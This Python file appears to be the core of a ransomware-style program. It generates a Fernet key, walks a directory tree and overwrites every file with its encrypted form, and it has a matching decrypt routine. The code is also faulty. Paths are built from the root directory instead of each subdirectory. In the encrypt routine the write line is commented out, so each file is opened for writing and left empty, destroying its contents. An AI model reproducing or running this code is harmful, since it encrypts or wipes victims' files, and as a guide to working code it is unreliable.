from cryptography.fernet import Fernet
import os
import ctypes
import socket
import datetime, sys


        
def key_gen():
    return Fernet.generate_key()

		
def decrypt_all_dir(root_dir, key):
    for dirName, subDirList, fileList in os.walk(root_dir):
        for file in fileList:
                    print(os.path.join(root_dir, file))
                    try:
                            o = open(os.path.join(root_dir, file), 'rb')
                    except PermissionError:
                            continue
                    except FileNotFoundError:
                            continue
                    o = open(os.path.join(root_dir, file), 'rb')
                    data = o.read()
                    o.close()
                    fernet = Fernet(key)
                    decrypted = fernet.decrypt(data)

                    try:
                            o = open(os.path.join(root_dir, file), 'wb')
                    except PermissionError:
                            continue
                    except FileNotFoundError:
                            continue
                    o = open(os.path.join(root_dir, file), 'wb')
                    o.write(decrypted)
                    o.close()


def encrypt_all_dir(root_dir, key):
    for dirName, subDirList, fileList in os.walk(root_dir):
            for file in fileList:
                    try:
                            o = open(os.path.join(root_dir, file), 'rb')
                    except PermissionError:
                            continue
                    except FileNotFoundError:
                            continue
                    o = open(os.path.join(root_dir, file), 'rb')
                    data = o.read()
                    o.close()
                    fernet = Fernet(key)
                    encrypted = fernet.encrypt(data)

                    try:
                            o = open(os.path.join(root_dir, file), 'wb')
                    except PermissionError:
                            continue
                    except FileNotFoundError:
                            continue
                    o = open(os.path.join(root_dir, file), 'wb')
                    #o.write(encrypted)
                    o.close()